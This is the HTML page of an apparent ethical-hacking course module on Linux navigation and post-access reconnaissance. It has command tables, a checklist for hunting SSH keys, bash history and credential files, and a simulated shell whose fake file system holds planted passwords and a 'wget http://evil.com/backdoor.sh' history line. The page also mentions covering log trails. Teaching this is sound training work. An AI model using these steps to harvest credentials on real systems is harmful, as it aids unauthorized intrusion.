<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CLH-002: Navigation & Reconnaissance - Hexworth Prime</title>
    <style>
        :root {
            --house-primary: #a78bfa;
            --house-secondary: #8b5cf6;
            --house-glow: rgba(167, 139, 250, 0.3);
            --terminal-green: #4ade80;
            --terminal-bg: #0d1117;
            --success: #22c55e;
            --warning: #f59e0b;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: #0a0a0f;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #e0e0e0;
        }

        .module-header {
            padding: 20px 40px;
            border-bottom: 1px solid rgba(167, 139, 250, 0.2);
            background: rgba(10, 10, 15, 0.95);
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
            backdrop-filter: blur(10px);
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .back-btn {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: #888;
            font-size: 0.8rem;
            text-decoration: none;
            transition: all 0.3s ease;
        }

        .back-btn:hover {
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
        }

        .module-badge {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 10px 20px;
            background: rgba(167, 139, 250, 0.1);
            border: 1px solid rgba(167, 139, 250, 0.3);
            border-radius: 25px;
        }

        .module-badge-text {
            font-size: 0.75rem;
            letter-spacing: 0.15em;
            color: var(--house-primary);
            text-transform: uppercase;
        }

        .content-wrapper {
            max-width: 900px;
            margin: 0 auto;
            padding: 40px 20px;
        }

        .module-title {
            font-size: 2.5rem;
            margin-bottom: 10px;
            background: linear-gradient(135deg, var(--house-primary), var(--terminal-green));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .module-subtitle {
            color: #888;
            font-size: 1.1rem;
            margin-bottom: 30px;
        }

        .section {
            background: rgba(15, 15, 20, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
        }

        .section h2 {
            color: var(--house-primary);
            font-size: 1.4rem;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .section p {
            line-height: 1.8;
            margin-bottom: 15px;
            color: #ccc;
        }

        .terminal {
            background: var(--terminal-bg);
            border: 1px solid rgba(74, 222, 128, 0.3);
            border-radius: 8px;
            padding: 20px;
            font-family: 'Consolas', 'Monaco', monospace;
            margin: 20px 0;
            position: relative;
            overflow-x: auto;
        }

        .terminal::before {
            content: '$ terminal';
            position: absolute;
            top: -10px;
            left: 15px;
            background: var(--terminal-bg);
            padding: 0 10px;
            font-size: 0.7rem;
            color: var(--terminal-green);
            letter-spacing: 0.1em;
        }

        .terminal code {
            color: var(--terminal-green);
            display: block;
            line-height: 1.6;
            white-space: pre-wrap;
        }

        .terminal .prompt {
            color: #60a5fa;
        }

        .terminal .command {
            color: #fff;
        }

        .terminal .output {
            color: #888;
        }

        .terminal .dir {
            color: #60a5fa;
        }

        .terminal .file {
            color: #e0e0e0;
        }

        .terminal .exec {
            color: var(--terminal-green);
        }

        .command-table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }

        .command-table th,
        .command-table td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .command-table th {
            background: rgba(167, 139, 250, 0.1);
            color: var(--house-primary);
            font-weight: 600;
        }

        .command-table code {
            background: rgba(74, 222, 128, 0.1);
            color: var(--terminal-green);
            padding: 2px 8px;
            border-radius: 4px;
            font-family: 'Consolas', monospace;
        }

        .key-points {
            display: grid;
            gap: 15px;
            margin: 20px 0;
        }

        .key-point {
            display: flex;
            align-items: flex-start;
            gap: 15px;
            padding: 15px;
            background: rgba(167, 139, 250, 0.05);
            border-left: 3px solid var(--house-primary);
            border-radius: 0 8px 8px 0;
        }

        .key-point-icon {
            font-size: 1.5rem;
            flex-shrink: 0;
        }

        .key-point-content h4 {
            color: var(--house-primary);
            margin-bottom: 5px;
        }

        .key-point-content p {
            margin: 0;
            font-size: 0.9rem;
        }

        .hacker-mindset {
            background: linear-gradient(135deg, rgba(74, 222, 128, 0.1), rgba(167, 139, 250, 0.1));
            border: 1px solid rgba(74, 222, 128, 0.3);
            border-radius: 12px;
            padding: 25px;
            margin: 30px 0;
        }

        .hacker-mindset h3 {
            color: var(--terminal-green);
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .hacker-mindset ul {
            list-style: none;
            padding-left: 0;
        }

        .hacker-mindset li {
            padding: 8px 0;
            padding-left: 25px;
            position: relative;
            color: #ccc;
        }

        .hacker-mindset li::before {
            content: '>';
            position: absolute;
            left: 0;
            color: var(--terminal-green);
            font-family: monospace;
        }

        /* Interactive Lab */
        .lab-section {
            background: linear-gradient(135deg, rgba(74, 222, 128, 0.1), rgba(167, 139, 250, 0.1));
            border: 1px solid rgba(74, 222, 128, 0.3);
            border-radius: 12px;
            padding: 25px;
            margin: 30px 0;
        }

        .lab-section h3 {
            color: var(--terminal-green);
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .interactive-terminal {
            background: var(--terminal-bg);
            border: 1px solid rgba(74, 222, 128, 0.3);
            border-radius: 8px;
            overflow: hidden;
            margin: 20px 0;
        }

        .terminal-header {
            background: rgba(255, 255, 255, 0.05);
            padding: 8px 15px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .terminal-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }

        .terminal-dot.red { background: #ef4444; }
        .terminal-dot.yellow { background: #fbbf24; }
        .terminal-dot.green { background: #22c55e; }

        .terminal-body {
            padding: 15px;
        }

        .terminal-output {
            color: #888;
            font-family: 'Consolas', monospace;
            font-size: 0.85rem;
            line-height: 1.6;
            min-height: 200px;
            max-height: 350px;
            overflow-y: auto;
            margin-bottom: 10px;
            white-space: pre-wrap;
        }

        .terminal-input-line {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .terminal-prompt {
            color: var(--terminal-green);
            font-family: 'Consolas', monospace;
        }

        .terminal-input {
            flex: 1;
            background: transparent;
            border: none;
            color: #fff;
            font-family: 'Consolas', monospace;
            font-size: 0.9rem;
            outline: none;
        }

        .run-btn {
            padding: 8px 20px;
            background: var(--terminal-green);
            color: #000;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .run-btn:hover {
            background: #22c55e;
            transform: scale(1.05);
        }

        .success-message {
            display: none;
            background: rgba(34, 197, 94, 0.2);
            border: 1px solid var(--success);
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
        }

        .success-message.show {
            display: block;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .progress-section {
            text-align: center;
            padding: 40px;
            background: rgba(167, 139, 250, 0.05);
            border-radius: 12px;
            margin-top: 40px;
        }

        .progress-section h3 {
            color: var(--house-primary);
            margin-bottom: 20px;
        }

        .module-nav {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .nav-btn {
            padding: 12px 30px;
            border-radius: 8px;
            font-size: 0.9rem;
            text-decoration: none;
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .nav-btn.primary {
            background: linear-gradient(135deg, var(--house-primary), var(--house-secondary));
            color: #fff;
            border: none;
        }

        .nav-btn.primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px var(--house-glow);
        }

        .nav-btn.secondary {
            background: rgba(255, 255, 255, 0.05);
            color: #ccc;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .title-badge {
            display: inline-block;
            background: linear-gradient(135deg, rgba(74, 222, 128, 0.2), rgba(167, 139, 250, 0.2));
            border: 1px solid rgba(74, 222, 128, 0.5);
            padding: 8px 20px;
            border-radius: 20px;
            font-size: 0.85rem;
            color: var(--terminal-green);
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <header class="module-header">
        <div class="header-left">
            <a href="../index.html" class="back-btn">
                <span>&larr;</span> Script House
            </a>
            <div class="module-badge">
                <span style="font-size: 1.5rem;">üß≠</span>
                <span class="module-badge-text">Navigation</span>
            </div>
        </div>
        <div class="header-right">
            <span style="color: #666; font-size: 0.8rem;">CLH-002 of 015</span>
        </div>
    </header>

    <main class="content-wrapper">
        <h1 class="module-title">Navigation & Reconnaissance</h1>
        <p class="module-subtitle">Map the terrain. Every hacker's first move is knowing where they are and what's around them.</p>

        <section class="section">
            <h2>üó∫Ô∏è Know Your Territory</h2>
            <p>
                When you gain access to a new system, your first task is <strong>reconnaissance</strong> -
                understanding the file system layout, finding interesting files, and mapping what's available.
                This isn't just about typing commands; it's about developing a mental model of the system.
            </p>
            <p>
                The Linux file system is a tree structure starting from <code>/</code> (root). Everything -
                devices, processes, configurations - appears as files. Master navigation, and you control the system.
            </p>
        </section>

        <section class="section">
            <h2>üìÇ Essential Navigation Commands</h2>

            <table class="command-table">
                <tr>
                    <th>Command</th>
                    <th>Purpose</th>
                    <th>Hacker Use</th>
                </tr>
                <tr>
                    <td><code>cd [path]</code></td>
                    <td>Change directory</td>
                    <td>Move to target locations</td>
                </tr>
                <tr>
                    <td><code>ls -la</code></td>
                    <td>List all files with details</td>
                    <td>Find hidden files, check permissions</td>
                </tr>
                <tr>
                    <td><code>tree</code></td>
                    <td>Visual directory structure</td>
                    <td>Quick recon of folder hierarchy</td>
                </tr>
                <tr>
                    <td><code>find / -name "*.conf"</code></td>
                    <td>Search for files</td>
                    <td>Locate config files, credentials</td>
                </tr>
                <tr>
                    <td><code>locate filename</code></td>
                    <td>Fast file search (database)</td>
                    <td>Quick discovery of known files</td>
                </tr>
                <tr>
                    <td><code>cat / head / tail</code></td>
                    <td>View file contents</td>
                    <td>Read configs, logs, scripts</td>
                </tr>
            </table>

            <div class="terminal">
                <code><span class="prompt">hacker@target:~$</span> <span class="command">cd /etc</span>
<span class="prompt">hacker@target:/etc$</span> <span class="command">ls -la | head -10</span>
<span class="output">total 1284
drwxr-xr-x 142 root root   12288 Dec 25 10:00 <span class="dir">.</span>
drwxr-xr-x  23 root root    4096 Dec 20 08:00 <span class="dir">..</span>
-rw-r--r--   1 root root    3028 Dec 15 14:22 <span class="file">adduser.conf</span>
drwxr-xr-x   2 root root    4096 Dec 10 09:15 <span class="dir">alternatives</span>
drwxr-xr-x   8 root root    4096 Dec 20 08:00 <span class="dir">apache2</span>
-rw-r--r--   1 root root     367 Dec  1 12:00 <span class="file">hosts</span>
-rw-r-----   1 root shadow  1423 Dec 18 16:30 <span class="file">shadow</span>
-rw-r--r--   1 root root    2981 Dec 18 16:30 <span class="file">passwd</span></span></code>
            </div>
        </section>

        <section class="section">
            <h2>üîë Critical Linux Directories</h2>

            <div class="key-points">
                <div class="key-point">
                    <span class="key-point-icon">‚öôÔ∏è</span>
                    <div class="key-point-content">
                        <h4>/etc - Configuration Central</h4>
                        <p>System configs, user accounts (passwd/shadow), service settings. The first place to check.</p>
                    </div>
                </div>
                <div class="key-point">
                    <span class="key-point-icon">üè†</span>
                    <div class="key-point-content">
                        <h4>/home - User Territory</h4>
                        <p>User home directories. Check for .ssh keys, .bash_history, personal configs, documents.</p>
                    </div>
                </div>
                <div class="key-point">
                    <span class="key-point-icon">üìú</span>
                    <div class="key-point-content">
                        <h4>/var/log - The Evidence Trail</h4>
                        <p>System and application logs. Both a goldmine for forensics and a trail to cover.</p>
                    </div>
                </div>
                <div class="key-point">
                    <span class="key-point-icon">üóëÔ∏è</span>
                    <div class="key-point-content">
                        <h4>/tmp - Temporary Treasures</h4>
                        <p>World-writable, often contains cached data, session files, sometimes credentials.</p>
                    </div>
                </div>
                <div class="key-point">
                    <span class="key-point-icon">üîß</span>
                    <div class="key-point-content">
                        <h4>/opt & /usr/local - Custom Software</h4>
                        <p>Third-party applications often installed here. May have weaker security than system packages.</p>
                    </div>
                </div>
            </div>
        </section>

        <div class="hacker-mindset">
            <h3>üß† Reconnaissance Checklist</h3>
            <ul>
                <li><strong>Check /etc/passwd</strong> - List all users, find service accounts</li>
                <li><strong>Look for .ssh directories</strong> - Private keys are golden tickets</li>
                <li><strong>Search for config files</strong> - <code>find / -name "*.conf" 2>/dev/null</code></li>
                <li><strong>Check bash history</strong> - Previous commands reveal habits and secrets</li>
                <li><strong>Look for backup files</strong> - .bak, .old, .backup often contain originals</li>
                <li><strong>Examine cron jobs</strong> - Scheduled tasks may run with elevated privileges</li>
            </ul>
        </div>

        <!-- Interactive Lab -->
        <div class="lab-section">
            <h3>üéØ LAB: Explore the File System</h3>

            <p>You've gained shell access to a target system. Your mission: explore the file system and
            find the interesting files. Use navigation commands to discover what's on this system.</p>

            <div class="interactive-terminal">
                <div class="terminal-header">
                    <span class="terminal-dot red"></span>
                    <span class="terminal-dot yellow"></span>
                    <span class="terminal-dot green"></span>
                    <span style="color: #888; margin-left: 10px; font-size: 0.8rem;">recon-shell</span>
                </div>
                <div class="terminal-body">
                    <div class="terminal-output" id="terminalOutput">Welcome to Reconnaissance Lab
================================
You have shell access. Explore the system.

Current directory: /home/user
Try: ls, cd, cat, pwd, find

Objectives:
1. List the files in your home directory
2. Find the system log file
3. Discover the hidden config file
</div>
                    <div class="terminal-input-line">
                        <span class="terminal-prompt" id="promptDisplay">user@target:~$</span>
                        <input type="text" class="terminal-input" id="terminalInput" placeholder="type command..." autocomplete="off">
                        <button class="run-btn" onclick="runCommand()">Run</button>
                    </div>
                </div>
            </div>

            <div class="success-message" id="successMessage">
                <strong style="color: var(--success);">üéâ RECON COMPLETE!</strong>
                <p style="margin-top: 10px;">You've successfully navigated the file system and found the key files!</p>
                <p style="color: #888; font-size: 0.9rem; margin-top: 5px;">
                    Skills demonstrated: directory navigation, file discovery, reading configs.
                </p>
            </div>
        </div>

        <div class="progress-section">
            <h3>Ready to Test Your Skills?</h3>
            <p style="color: #888; margin-bottom: 20px;">
                Complete the quiz to prove your navigation abilities.
            </p>
            <div class="module-nav">
                <a href="clh-002-quiz.html" class="nav-btn primary">Take the Quiz &rarr;</a>
                <a href="../index.html" class="nav-btn secondary">Back to Script House</a>
            </div>
            <div class="title-badge">
                üéñÔ∏è Completing CLH-001 to CLH-003 earns: CLI Recruit
            </div>
        </div>
    </main>

    <script src="../../../components/TrailHunter.js"></script>
    <script src="../../../components/ModuleProgress.js"></script>

    <script>
        // Virtual file system
        const fileSystem = {
            '/': {
                type: 'dir',
                contents: ['home', 'etc', 'var', 'tmp', 'opt', 'usr']
            },
            '/home': {
                type: 'dir',
                contents: ['user', 'admin']
            },
            '/home/user': {
                type: 'dir',
                contents: ['Documents', 'Downloads', '.bashrc', '.bash_history', '.ssh', 'notes.txt']
            },
            '/home/user/Documents': {
                type: 'dir',
                contents: ['ProjectReport.txt', 'MeetingNotes.txt', 'MyFavoriteRecipe.txt']
            },
            '/home/user/Documents/ProjectReport.txt': {
                type: 'file',
                content: 'Project Status Report\n====================\nPhase 1: Complete\nPhase 2: In Progress\nBudget: On Track'
            },
            '/home/user/Documents/MeetingNotes.txt': {
                type: 'file',
                content: 'Meeting Notes - Dec 2025\n- Discussed security upgrades\n- Review access controls\n- Password policy update scheduled'
            },
            '/home/user/.bashrc': {
                type: 'file',
                content: '# ~/.bashrc\nexport PATH=$PATH:/usr/local/bin\nalias ll="ls -la"\n# API_KEY=sk_test_hidden123  # TODO: remove this'
            },
            '/home/user/.bash_history': {
                type: 'file',
                content: 'sudo apt update\nssh admin@192.168.1.50\nmysql -u root -p\ncat /etc/shadow\nwget http://evil.com/backdoor.sh'
            },
            '/home/user/.ssh': {
                type: 'dir',
                contents: ['id_rsa', 'id_rsa.pub', 'known_hosts']
            },
            '/home/user/.ssh/id_rsa': {
                type: 'file',
                content: '-----BEGIN RSA PRIVATE KEY-----\n[REDACTED - Private Key Found!]\n-----END RSA PRIVATE KEY-----'
            },
            '/home/user/notes.txt': {
                type: 'file',
                content: 'Remember: backup server password is Summer2025!\nAdmin portal: https://admin.internal.local'
            },
            '/etc': {
                type: 'dir',
                contents: ['passwd', 'shadow', 'hosts', 'ssh', 'apache2']
            },
            '/etc/passwd': {
                type: 'file',
                content: 'root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:User:/home/user:/bin/bash\nadmin:x:1001:1001:Admin:/home/admin:/bin/bash\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false'
            },
            '/etc/hosts': {
                type: 'file',
                content: '127.0.0.1   localhost\n192.168.1.10  webserver\n192.168.1.20  database\n192.168.1.30  fileserver'
            },
            '/var': {
                type: 'dir',
                contents: ['log', 'www', 'lib']
            },
            '/var/log': {
                type: 'dir',
                contents: ['auth.log', 'syslog', 'apache2']
            },
            '/var/log/auth.log': {
                type: 'file',
                content: 'Dec 25 09:15:22 server sshd[1234]: Accepted password for user\nDec 25 09:45:33 server sshd[1235]: Failed password for root from 10.0.0.99\nDec 25 09:45:35 server sshd[1236]: Failed password for root from 10.0.0.99'
            },
            '/tmp': {
                type: 'dir',
                contents: ['sess_abc123', '.hidden_config']
            },
            '/tmp/.hidden_config': {
                type: 'file',
                content: '# Hidden Configuration\ndb_password=production_secret_2025\napi_endpoint=https://api.internal.corp'
            }
        };

        let currentPath = '/home/user';
        let discovered = { ls: false, hidden: false, log: false };

        function resolvePath(path) {
            if (path.startsWith('/')) return path;
            if (path === '..') {
                const parts = currentPath.split('/').filter(p => p);
                parts.pop();
                return '/' + parts.join('/') || '/';
            }
            if (path === '.') return currentPath;
            return currentPath === '/' ? '/' + path : currentPath + '/' + path;
        }

        function runCommand() {
            const input = document.getElementById('terminalInput');
            const output = document.getElementById('terminalOutput');
            const command = input.value.trim();
            const prompt = document.getElementById('promptDisplay').textContent;

            if (!command) return;

            output.innerHTML += `\n${prompt} ${command}\n`;

            const parts = command.split(/\s+/);
            const cmd = parts[0];
            const args = parts.slice(1);

            switch(cmd) {
                case 'pwd':
                    output.innerHTML += currentPath + '\n';
                    break;
                case 'ls':
                    handleLs(args, output);
                    break;
                case 'cd':
                    handleCd(args, output);
                    break;
                case 'cat':
                    handleCat(args, output);
                    break;
                case 'find':
                    handleFind(args, output);
                    break;
                case 'clear':
                    output.innerHTML = '';
                    break;
                case 'help':
                    output.innerHTML += 'Commands: ls, cd, cat, pwd, find, clear\n';
                    break;
                default:
                    output.innerHTML += `Command not found: ${cmd}\n`;
            }

            checkProgress();
            output.scrollTop = output.scrollHeight;
            input.value = '';
        }

        function handleLs(args, output) {
            let path = currentPath;
            let showHidden = false;
            let longFormat = false;

            args.forEach(arg => {
                if (arg.includes('a')) showHidden = true;
                if (arg.includes('l')) longFormat = true;
                if (!arg.startsWith('-')) path = resolvePath(arg);
            });

            const node = fileSystem[path];
            if (!node || node.type !== 'dir') {
                output.innerHTML += `ls: cannot access '${path}': No such directory\n`;
                return;
            }

            let files = node.contents.filter(f => showHidden || !f.startsWith('.'));

            if (longFormat) {
                files.forEach(f => {
                    const fullPath = path === '/' ? '/' + f : path + '/' + f;
                    const child = fileSystem[fullPath];
                    const isDir = child && child.type === 'dir';
                    output.innerHTML += `${isDir ? 'drwxr-xr-x' : '-rw-r--r--'}  ${isDir ? '<span class="dir">' + f + '</span>' : f}\n`;
                });
            } else {
                output.innerHTML += files.join('  ') + '\n';
            }

            discovered.ls = true;
            if (showHidden && path.includes('tmp')) discovered.hidden = true;
        }

        function handleCd(args, output) {
            if (args.length === 0) {
                currentPath = '/home/user';
            } else {
                const newPath = resolvePath(args[0]);
                const node = fileSystem[newPath];
                if (node && node.type === 'dir') {
                    currentPath = newPath;
                } else {
                    output.innerHTML += `cd: ${args[0]}: No such directory\n`;
                    return;
                }
            }
            updatePrompt();
        }

        function handleCat(args, output) {
            if (args.length === 0) {
                output.innerHTML += 'cat: missing file operand\n';
                return;
            }
            const path = resolvePath(args[0]);
            const node = fileSystem[path];
            if (!node) {
                output.innerHTML += `cat: ${args[0]}: No such file\n`;
            } else if (node.type === 'dir') {
                output.innerHTML += `cat: ${args[0]}: Is a directory\n`;
            } else {
                output.innerHTML += node.content + '\n';
                if (path.includes('auth.log') || path.includes('syslog')) {
                    discovered.log = true;
                }
            }
        }

        function handleFind(args, output) {
            const results = [];
            const pattern = args.find(a => a.includes('*') || !a.startsWith('-'));

            Object.keys(fileSystem).forEach(path => {
                if (pattern && path.includes(pattern.replace('*', ''))) {
                    results.push(path);
                }
            });

            if (results.length > 0) {
                output.innerHTML += results.slice(0, 10).join('\n') + '\n';
            } else {
                output.innerHTML += '(no matches)\n';
            }
        }

        function updatePrompt() {
            const shortPath = currentPath === '/home/user' ? '~' : currentPath;
            document.getElementById('promptDisplay').textContent = `user@target:${shortPath}$`;
        }

        function checkProgress() {
            if (discovered.ls && discovered.hidden && discovered.log) {
                document.getElementById('successMessage').classList.add('show');
            }
        }

        document.getElementById('terminalInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') runCommand();
        });
    </script>
</body>
</html>
